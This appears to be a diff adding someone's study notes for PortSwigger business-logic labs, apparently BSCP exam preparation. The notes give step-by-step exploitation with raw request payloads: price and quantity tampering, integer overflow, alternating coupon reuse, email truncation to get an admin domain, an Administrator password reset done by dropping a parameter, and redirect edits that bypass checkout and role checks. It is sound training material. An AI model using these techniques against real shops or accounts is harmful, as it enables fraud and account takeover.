@@ -1,0 +1,136 @@
+# Excessive trust in client-side controls
+1. Turn on Proxy intercept and capture request to add l33t jacket to cart
+2. Change `price` parameter to `1`
+```
+productId=1&redir=PRODUCT&quantity=1&price=1
+```
+1. Check cart and total is `$0.01`
+# High-level logic vulnerability
+1. Put l33t jacket in cart
+2. Capture POST request adding item and set `quantity` parameter to `-2`
+3. Check cart and see quantity is `-1` making cart total `-$1337.00`
+4. Make l33t jacket quantity `1`
+5. Place another item in the cart and repeat step `3` to make item go into the negative quantity reducing cart total (cart total must be a positive integer)
+```
+productId=2&redir=PRODUCT&quantity=-15
+```
+- You will need to calculate how many items are needed to manipulate the cart total
+# Inconsistent security controls
+1. Register account on site using exploit server email
+	- Take note of the message saying "If you work for DontWannaCry, please use your @dontwannacry.com email address"
+2. Authenticate to the website with your new account
+3. Update account details and change email to `@dontwannacry.com`
+4. Access admin panel > Delete Carlos user
+# Flawed enforcement of business rules
+1. Subscribe at the bottom of the page
+2. Identify new customer code at top of page
+	1. We have two discount codes
+```
+NEWCUST5
+SIGNUP30
+```
+3. Add l33t jacket to cart
+4. Apply both discount codes
+5. Codes can be applied multiple times as long as they are alternating
+6. Repeat process until you can buy jacket
+# Low-level logic flaw
+1. Add l33t jacket to cart
+2. Modify `quantity` parameter to `99` and submit request (limit is `99` per request)
+```
+productId=1&redir=PRODUCT&quantity=99
+```
+3. Send request to repeater and use Payload type: `Null payloads`
+4. Configure the payload to run ~500 times
+5. Check basket and cart total will have entered a negative integer
+6. Add a second item and use a calculator to determine how many items you need to make the cart total a small positive integer
+7. Eventually you'll get a cart looking like
+
+| Name         | Price    | Quantity |
+| ------------ | -------- | -------- |
+| l33t jacket  | $1337.00 | 29712    |
+| Picture box  | $64.13   | 370      |
+| AbZorba Ball | $83.55   | 38313    |
+8. Cart total is now a small enough positive integer to make purchase
+# Inconsistent handling of exceptional input
+1. Register account on site using exploit server email
+	- Take note of the message saying "If you work for DontWannaCry, please use your @dontwannacry.com email address"
+2. After registering and logging in, you can see your email but you cannot change it
+3. Register second account and intercept the request
+4. Test overflowing the email value
+```
+username=user1&email=testing123@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.exploit-0a9900060362357b82cba7c101400098.exploit-server.net&password=password
+```
+5. Authenticate with this user and confirm the email presented to you on your "My Account" page is cut off showing
+```
+Your email is: testing123@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+6. Copy entire email field and use `wc` to determine number of characters
+```sh
+echo -n "{{copied data}}" | wc -c
+```
+- Field is `255` characters
+- Subtract the `17` from `@dontwannacry.com`  = `238`
+7. Register a new account and overflow the email parameter so your account is registered under the `@dontwannacry.com` but the email is still sent to the exploit server
+```
+username=user3&email=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%40dontwannacry.com.exploit-0a9900060362357b82cba7c101400098.exploit-server.net&password=password
+```
+8. Authenticate with this user and you will see admin panel
+9. "My account" page presents the following:
+```
+Your email is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@dontwannacry.com
+```
+# Weak isolation on dual-use endpoint
+1. Login to application
+2. "My account" page has options to change email and password
+3. Intercept POST request to change password of your account
+```
+username=wiener&current-password=peter&new-password-1=password&new-password-2=password
+```
+4. Changing `username` parameter to `Administrator` returns a `302` redirect to login
+5. Remove the `current-password` parameter from the request and receive `200 OK` indicating password has changed
+6. Authenticate as Administrator to application > Delete user `Carlos`
+# Insufficient workflow validation
+1. Place order for product that can be afforded
+2. Intercept Request and Responses
+	- Collect the following URL when order is successful
+```
+Request:
+POST /car/checkout
+
+Response:
+303 See Other
+Location: /cart/order-confirmation?order-confirmed=true
+```
+3. Armed with this URL place an order on l33t jacket and intercept the "check out" request
+4. Modify HTTP response from error to confirm
+```
+ORIGINAL:
+HTTP/2 303 See Other
+Location: /cart?err=INSUFFICIENT_FUNDS
+
+EDITED:
+HTTP/2 303 See Other
+Location: /cart/order-confirmation?order-confirmed=true
+```
+5. Order will be placed
+# Authentication bypass via flawed state machine
+- Normal authentication flow is:
+	1. Authenticate
+	2. `302` to `/role-selector` > Select Role (`user` or `content-author`)
+	3. `302` to `/my-account?id={username}`
+- Bypass authentication:
+1. Intercept authentication request
+2. Modify HTTP response changed `302` redirect straight to `/my-account?id={username}` (make username the account you authenticated with)
+3. Forward request (you will receive `302` redirect to `/login` - Do not change > Turn of intercept)
+4. On login page you will see `Admin panel` > Delete Carlos
+# Infinite money logic flaw
+1. Signup at bottom and receive code `SIGNUP30` for discount
+2. Gift cards can be bought for `$10.00` > Add to cart
+3. Apply discount coupon and purchase gift card > Place order
+4. Order confirmation page reveals gift card code
+5. Copy code > My account > Enter gift card code > Redeem
+6. `$3.00` has been gained
+- **Configure Burp macros to automate process:**
+
+#### Image test
+[[/BSCP/Business Logic Vulnerabilities/Resources/Images/Image test]]
